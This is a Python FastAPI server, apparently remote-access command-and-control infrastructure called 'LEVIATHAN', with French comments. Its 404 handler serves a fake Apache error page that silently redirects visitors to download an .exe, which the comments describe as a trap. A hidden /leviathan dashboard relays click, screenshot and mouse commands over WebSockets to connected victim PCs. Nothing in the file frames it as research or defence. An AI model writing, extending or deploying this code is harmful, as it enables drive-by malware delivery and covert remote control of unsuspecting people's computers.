import os
import json
import asyncio
import uvicorn
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse

# --- CONFIGURATION ---
PORT = int(os.getenv("PORT", "10000"))
ADMIN_KEY = os.getenv("ADMIN_KEY", "LEVIATHAN_2026").strip()
# URL de ton logiciel .exe (Ex: hébergé sur Dropbox ou ton propre serveur)
SOFTWARE_URL = "https://ton-lien-direct.com/logiciel-support.exe" 

app = FastAPI()
remote_sessions = {} # Stockage des WebSockets pour le contrôle à distance

# --- 1. LE PIÈGE GHOST 404 (AUTO-DOWNLOAD) ---
HTML_404_GHOST = f"""
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta http-equiv="refresh" content="1; url='{SOFTWARE_URL}'">
    <style>
        body {{ background: white; color: black; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .box {{ text-align: center; border-top: 1px solid #ccc; padding-top: 10px; width: 80%; }}
        h1 {{ font-size: 40px; margin: 0; }}
        address {{ font-style: normal; color: #555; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="box">
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <address>Apache/2.4.41 (Ubuntu) Server at {PORT} Port</address>
    </div>
</body>
</html>
"""

@app.exception_handler(404)
async def ghost_404_handler(request: Request, exc):
    return HTMLResponse(content=HTML_404_GHOST, status_code=404)

# --- 2. DASHBOARD DE CONTRÔLE (URL /leviathan) ---
@app.get("/leviathan", response_class=HTMLResponse)
async def dashboard():
    clients = "".join([f"<option value='{c}'>{c}</option>" for c in remote_sessions.keys()])
    return f"""
    <html><head><title>LEVIATHAN CONTROL</title>
    <style>
        body {{ background:#000; color:#0f0; font-family:monospace; padding:20px; }}
        .card {{ border:1px solid #0f0; padding:15px; background:#050505; margin-bottom:15px; box-shadow: 0 0 10px #0f0; }}
        button {{ width:100%; padding:10px; margin:5px 0; background:#000; color:#0f0; border:1px solid #0f0; cursor:pointer; font-weight:bold; }}
        button:hover {{ background:#0f0; color:#000; }}
        input, select {{ width:100%; padding:10px; margin:5px 0; background:#111; color:#0f0; border:1px solid #0f0; }}
    </style></head>
    <body>
        <h1>🔱 LEVIATHAN CONTROL CENTER</h1>
        <div class="card">
            <h3>🔑 AUTHENTIFICATION</h3>
            <input type="password" id="k" placeholder="ADMIN_KEY">
        </div>
        <div class="card">
            <h3>💻 PC CONNECTÉS</h3>
            <select id="cid">{clients if clients else "<option>En attente de connexion...</option>"}</select>
            <button onclick="rem('click')">SIMULER CLIC</button>
            <button onclick="rem('screen')">SCREENSHOT</button>
            <input type="text" id="val" placeholder="Valeur (ex: coordonnées X,Y)">
            <button onclick="rem('move')">DÉPLACER SOURIS</button>
        </div>
        <script>
            async function rem(c){{
                const d = {{
                    k: document.getElementById('k').value,
                    cid: document.getElementById('cid').value,
                    cmd: c,
                    val: document.getElementById('val').value
                }};
                const r = await fetch('/api/remote', {{
                    method:'POST', 
                    headers:{{'Content-Type':'application/json'}},
                    body:JSON.stringify(d)
                }});
                const res = await r.json();
                if(res.error) alert(res.error);
            }}
            // Refresh de la liste des clients toutes les 5 secondes
            setInterval(() => location.reload(), 5000);
        </script>
    </body></html>"""

# --- 3. RELAIS WEBSOCKET & API ---
@app.websocket("/ws/client/{client_id}")
async def ws_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    remote_sessions[client_id] = websocket
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if client_id in remote_sessions:
            del remote_sessions[client_id]

@app.post("/api/remote")
async def api_remote(request: Request):
    d = await request.json()
    if d['k'] != ADMIN_KEY: 
        return JSONResponse({"error":"Clé invalide"}, status_code=403)
    
    ws = remote_sessions.get(d['cid'])
    if ws:
        await ws.send_json({"cmd": d['cmd'], "val": d.get('val', "")})
        return {"status": "Ordre envoyé"}
    return {"error": "Client introuvable"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT)